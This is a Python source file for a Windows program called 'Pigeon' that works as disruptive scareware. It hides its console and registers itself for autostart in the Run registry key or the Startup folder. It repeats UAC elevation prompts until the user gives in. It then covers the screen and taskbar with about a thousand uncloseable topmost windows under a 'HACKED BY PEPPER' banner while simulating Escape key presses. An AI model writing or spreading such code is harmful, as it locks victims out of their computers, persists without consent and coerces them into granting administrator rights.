import ctypes
from ctypes import wintypes
import math
import multiprocessing
import os
import random
import sys
import threading
import time
import tkinter as tk
import winreg
from PIL import Image, ImageTk, ImageOps

SW_HIDE = 0
SEE_MASK_NOCLOSEPROCESS = 0x00000040
INFINITE = 0xFFFFFFFF
ERROR_CANCELLED = 1223
VK_ESCAPE = 0x1B
KEYEVENTF_KEYUP = 0x0002

def hide_console():
    """Hides the Windows console window if one is attached."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE)
    except Exception:
        pass

# Immediately hide terminal on startup
hide_console()

class SHELLEXECUTEINFO(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("fMask", wintypes.ULONG),
        ("hwnd", wintypes.HWND),
        ("lpVerb", wintypes.LPCWSTR),
        ("lpFile", wintypes.LPCWSTR),
        ("lpParameters", wintypes.LPCWSTR),
        ("lpDirectory", wintypes.LPCWSTR),
        ("nShow", ctypes.c_int),
        ("hInstApp", wintypes.HINSTANCE),
        ("lpIDList", wintypes.LPVOID),
        ("lpClass", wintypes.LPCWSTR),
        ("hkeyClass", wintypes.HKEY),
        ("dwHotKey", wintypes.DWORD),
        ("hIconOrMonitor", wintypes.HANDLE),
        ("hProcess", wintypes.HANDLE),
    ]

def get_resource_path(relative_path: str) -> str:
    """Get absolute path to resource, works for dev and PyInstaller."""
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

def is_admin():
    """Check if the current process is running with Administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def get_python_exec():
    """Prefers pythonw.exe to prevent any console window creation."""
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        w_exe = exe[:-10] + "pythonw.exe"
        if os.path.exists(w_exe):
            return w_exe
    return exe

def add_to_autostart(app_name: str = "Pigeon") -> bool:
    """
    Registers the application to automatically start on Windows boot/login via HKCU Run registry key.
    Falls back to user Startup folder if registry access is restricted.
    """
    try:
        if getattr(sys, 'frozen', False):
            target_path = f'"{os.path.abspath(sys.executable)}"'
        else:
            py_exec = get_python_exec()
            script_path = os.path.abspath(sys.argv[0])
            target_path = f'"{py_exec}" "{script_path}"'

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
        return True
    except Exception:
        try:
            startup_dir = os.path.join(
                os.environ.get("APPDATA", ""),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            if os.path.isdir(startup_dir):
                bat_path = os.path.join(startup_dir, f"{app_name}.bat")
                with open(bat_path, "w", encoding="utf-8") as f:
                    f.write(f'@start "" {target_path}\n')
                return True
        except Exception:
            pass
        return False

def remove_from_autostart(app_name: str = "Pigeon") -> bool:
    """Removes the application from Windows HKCU Run key and Startup folder."""
    removed = False
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, app_name)
        winreg.CloseKey(key)
        removed = True
    except FileNotFoundError:
        removed = True
    except Exception:
        pass

    try:
        startup_bat = os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\Start Menu\Programs\Startup",
            f"{app_name}.bat"
        )
        if os.path.exists(startup_bat):
            os.remove(startup_bat)
            removed = True
    except Exception:
        pass

    return removed

def prompt_admin(attempt_number: int) -> bool:
    """
    Triggers a UAC elevation prompt silently in the background (no terminal).
    Works for both .py scripts and frozen standalone .exe binaries.
    Returns True if accepted/granted by user, False if declined/cancelled.
    """
    if getattr(sys, 'frozen', False):
        target_file = sys.executable
        target_dir = os.path.dirname(sys.executable)
        params = f'--worker {attempt_number}'
    else:
        script_path = os.path.abspath(sys.argv[0])
        target_dir = os.path.dirname(script_path)
        target_file = get_python_exec()
        params = f'"{script_path}" --worker {attempt_number}'

    sei = SHELLEXECUTEINFO()
    sei.cbSize = ctypes.sizeof(SHELLEXECUTEINFO)
    sei.fMask = SEE_MASK_NOCLOSEPROCESS
    sei.hwnd = None
    sei.lpVerb = "runas"
    sei.lpFile = target_file
    sei.lpParameters = params
    sei.lpDirectory = target_dir
    sei.nShow = SW_HIDE

    # Trigger UAC prompt
    success = ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(sei))
    
    if not success:
        return False

    # Wait for elevated child process to complete
    if sei.hProcess:
        ctypes.windll.kernel32.WaitForSingleObject(sei.hProcess, INFINITE)
        ctypes.windll.kernel32.CloseHandle(sei.hProcess)
    
    return True

class WalkingPigeonWindow:
    def __init__(self, master, x, y, w, h, tk_img):
        self.window = tk.Toplevel(master)
        self.width = w
        self.height = h
        self.x = x
        self.y = y

        # Borderless window covering the exact cell area, topmost over taskbar
        self.window.overrideredirect(True)
        self.window.geometry(f"{self.width}x{self.height}+{self.x}+{self.y}")
        self.window.attributes("-topmost", True)
        self.window.configure(bg="#000000")
        self.window.protocol("WM_DELETE_WINDOW", lambda: None)

        self.canvas = tk.Canvas(
            self.window,
            width=self.width,
            height=self.height,
            bg="#000000",
            bd=0,
            highlightthickness=0
        )
        self.canvas.pack(fill="both", expand=True)
        self.canvas.create_image(0, 0, anchor="nw", image=tk_img)

class BannerOverlay:
    def __init__(self, master, screen_w, screen_h):
        self.window = tk.Toplevel(master)
        self.window.overrideredirect(True)
        self.window.attributes("-topmost", True)
        self.window.configure(bg="#000000")
        self.window.protocol("WM_DELETE_WINDOW", lambda: None)

        font_size = max(42, int(screen_h * 0.075))
        font = ("Impact", font_size, "bold")

        label = tk.Label(
            self.window,
            text="HACKED BY PEPPER",
            font=font,
            fg="#FF0000",
            bg="#000000",
            padx=50,
            pady=25,
            relief="solid",
            bd=6,
            highlightbackground="#FF0000",
            highlightcolor="#FF0000",
            highlightthickness=4
        )
        label.pack(expand=True, fill="both")

        self.window.update_idletasks()
        w = label.winfo_reqwidth()
        h = label.winfo_reqheight()
        x = (screen_w - w) // 2
        y = (screen_h - h) // 2
        self.window.geometry(f"{w}x{h}+{x}+{y}")
        self.window.lift()

def show_walking_pigeons(count=1000):
    """Creates static pigeon windows covering 100% of the screen and taskbar seamlessly."""
    root = tk.Tk()
    root.withdraw()  # Hide root window

    # Full screen resolution including taskbar
    screen_w = ctypes.windll.user32.GetSystemMetrics(0)  # SM_CXSCREEN
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)  # SM_CYSCREEN
    if not screen_w or not screen_h:
        screen_w = root.winfo_screenwidth()
        screen_h = root.winfo_screenheight()

    img_path = get_resource_path("pigeon.png")
    if os.path.exists(img_path):
        base_img = Image.open(img_path).convert("RGBA")
        pigeon_aspect = base_img.width / max(1, base_img.height)
    else:
        base_img = None
        pigeon_aspect = 1.0

    display_aspect = screen_w / max(1, screen_h)
    cols = max(1, int(round(math.sqrt(count * display_aspect / pigeon_aspect))))
    rows = max(1, int(math.ceil(count / cols)))

    cell_w = max(1, int(math.ceil(screen_w / cols)))
    cell_h = max(1, int(math.ceil(screen_h / rows)))

    if base_img is not None:
        pigeon_img = base_img.resize((cell_w, cell_h), Image.Resampling.LANCZOS)
    else:
        pigeon_img = Image.new("RGBA", (cell_w, cell_h), (100, 140, 180, 255))

    tk_pigeon = ImageTk.PhotoImage(pigeon_img, master=root)

    windows = []
    for row in range(rows):
        for col in range(cols):
            x1 = int(col * screen_w / cols)
            x2 = int((col + 1) * screen_w / cols)
            y1 = int(row * screen_h / rows)
            y2 = int((row + 1) * screen_h / rows)
            w = max(1, x2 - x1)
            h = max(1, y2 - y1)
            win = WalkingPigeonWindow(root, x1, y1, w, h, tk_pigeon)
            windows.append(win)

    # Big red banner on top of the pigeons
    banner = BannerOverlay(root, screen_w, screen_h)

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()

def escape_clicker(cps: float = 3.0):
    """Continuously simulates pressing the Escape key at specified clicks per second (CPS)."""
    delay = 1.0 / cps
    press_duration = 0.02
    sleep_delay = max(0.0, delay - press_duration)
    scan_code = ctypes.windll.user32.MapVirtualKeyW(VK_ESCAPE, 0)

    while True:
        try:
            # Key down
            ctypes.windll.user32.keybd_event(VK_ESCAPE, scan_code, 0, 0)
            time.sleep(press_duration)
            # Key up
            ctypes.windll.user32.keybd_event(VK_ESCAPE, scan_code, KEYEVENTF_KEYUP, 0)
        except Exception:
            pass
        time.sleep(sleep_delay)

def start_escape_clicker(cps: float = 3.0):
    """Starts the escape clicker in a background daemon thread."""
    thread = threading.Thread(target=escape_clicker, args=(cps,), daemon=True)
    thread.start()
    return thread

def run_worker(attempt_number: int):
    """Executed when admin elevation is granted."""
    hide_console()
    add_to_autostart()
    start_escape_clicker(cps=3.0)
    show_walking_pigeons(count=1000)

def main():
    multiprocessing.freeze_support()
    hide_console()

    if "--remove-autostart" in sys.argv:
        remove_from_autostart()
        return

    add_to_autostart()

    if "--worker" in sys.argv:
        try:
            worker_idx = sys.argv.index("--worker")
            attempt_num = int(sys.argv[worker_idx + 1])
        except (IndexError, ValueError):
            attempt_num = 1
        run_worker(attempt_num)
        return

    if is_admin():
        run_worker(1)
        return

    # Prompt continuously in the background until admin permission is granted
    attempt = 1
    while True:
        granted = prompt_admin(attempt)
        if granted:
            break
        attempt += 1
        time.sleep(0.3)

if __name__ == "__main__":
    main()
